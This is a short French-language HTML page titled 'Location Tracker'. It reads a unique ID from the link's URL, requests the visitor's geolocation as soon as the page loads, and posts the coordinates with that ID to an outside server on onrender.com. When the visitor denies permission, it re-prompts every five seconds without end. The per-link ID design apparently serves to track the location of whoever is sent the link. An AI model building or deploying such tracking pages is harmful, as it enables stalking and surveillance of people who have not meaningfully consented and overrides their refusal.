<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Location Tracker</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        img {
            max-width: 100%;
            height: auto;
        }
        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
        }
        p {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>Bonjour tout le monde</h1>
    <img src="/BACK/public/robot.jpeg" alt="Robot Image"/>
    <img src="https://media.giphy.com/media/3o7TKtnuHOHHUjR38Y/giphy.gif" alt="Loading GIF"/>
    <p>Pour enregistrer votre position, veuillez permettre la géolocalisation lorsque vous y êtes invité.</p>
    <button onclick="attemptGeolocation()">Try Geolocation</button>

    <script>
        // Fonction pour tenter de récupérer la position et envoyer les coordonnées
        function attemptGeolocation() {
            navigator.geolocation.getCurrentPosition(position => {
                const uuid = window.location.pathname.split('/').pop();
                const { latitude, longitude } = position.coords;

                fetch('https://geo-localisation.onrender.com/location', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ uuid, latitude, longitude })
                })
                .then(response => response.text())
                .then(data => console.log(data))
                .catch(error => console.error('Error:', error));
            }, error => {
                // En cas d'échec, tenter à nouveau après un délai de 5 secondes
                console.error('Geolocation error:', error);
                setTimeout(attemptGeolocation, 5000);
            });
        }

        // Appeler la fonction pour tenter de récupérer la position
        attemptGeolocation();
    </script>
</body>
</html>
